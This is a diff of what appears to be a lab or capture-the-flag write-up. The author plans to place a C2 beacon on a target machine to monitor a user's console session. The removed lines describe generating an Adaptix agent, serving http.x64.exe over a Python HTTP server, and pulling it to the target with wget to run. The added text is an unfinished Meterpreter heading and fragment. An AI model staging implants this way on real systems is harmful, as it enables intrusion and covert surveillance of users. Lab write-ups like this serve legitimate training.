@@ -189,21 +189,8 @@ A console session is a direct session, so in other words the user is actually si
 
 In order to see what the user is doing in this session, it might be a good idea to upload a beacon to the target and place it in utils then i can monitor the session
 
-# Uploading beacon to `acute-pc01`
+# Meterpreter session 
 
-Ill start the adaptixserver and client and setup a listener and generate an agent
+I think this active session is int
 
-```python
- ❯❯❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.129.136.40 - - [20/Oct/2026 17:34:39] "GET /http.x64.exe HTTP/1.1" 200 -
-```
-
-Ill use wget to download the file into utils
-
-![](Pasted%20image%2020261020173605.png)
-
-![](Pasted%20image%2020261020173557.png)
-
-Ill run it and get a beacon
 
